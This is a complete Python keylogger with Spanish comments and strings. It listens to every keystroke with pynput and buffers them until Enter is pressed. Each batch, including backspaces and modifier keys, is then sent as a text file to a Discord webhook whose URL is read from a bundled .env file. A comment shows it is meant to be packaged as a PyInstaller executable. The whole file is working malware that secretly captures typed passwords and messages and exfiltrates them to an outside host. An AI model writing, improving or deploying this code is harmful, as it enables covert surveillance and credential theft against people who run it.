import io
import os
import sys
import requests
from dotenv import load_dotenv
from pynput.keyboard import Key, Listener


def resource_path(name: str) -> str:
    # Dentro de un .exe hecho con PyInstaller, los recursos se extraen en sys._MEIPASS
    base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base, name)


keys = []
load_dotenv(resource_path(".env"))
WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL")
_counter = 0


def send_report(content: str, message: str = "Reporte", file_name: str = "reporte.txt"):
    if not WEBHOOK_URL:
        raise RuntimeError("No se encontró la URL del webhook (revisa tu .env)")
    r = requests.post(
        WEBHOOK_URL,
        data={"content": message},
        files={"file": (file_name, content.encode("utf-8"), "text/plain")},
        timeout=30,
    )
    r.raise_for_status()


def on_press(key):
    global keys

    keys.append(key)

    if key == Key.enter:
        write_file(keys)
        keys = []


def write_file(keys):
    global _counter
    with io.StringIO() as f:
        for key in keys:
            if key == Key.space:
                f.write(" ")

            elif key == Key.enter:
                f.write("")

            elif key == Key.backspace:
                f.write("[DELETE]")

            elif key == Key.tab:
                f.write("[TAB]")

            elif key == Key.shift:
                f.write("")

            elif key == Key.shift_r:
                f.write("")

            elif key == Key.ctrl_l:
                f.write("[CTRL_L]")

            elif key == Key.ctrl_r:
                f.write("[CTRL_R]")

            elif key == Key.alt_l:
                f.write("[ALT_L]")

            elif key == Key.alt_r:
                f.write("[ALT_R]")

            elif hasattr(key, "char") and key.char is not None:
                f.write(key.char)

            else:
                f.write("[{0}]".format(key))

            content = f.getvalue()

    _counter += 1
    send_report(
        content,
        message=f"Reporte #{_counter}",
        file_name=f"reporte_{_counter}.txt",
    )


def on_release(key):
    pass


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
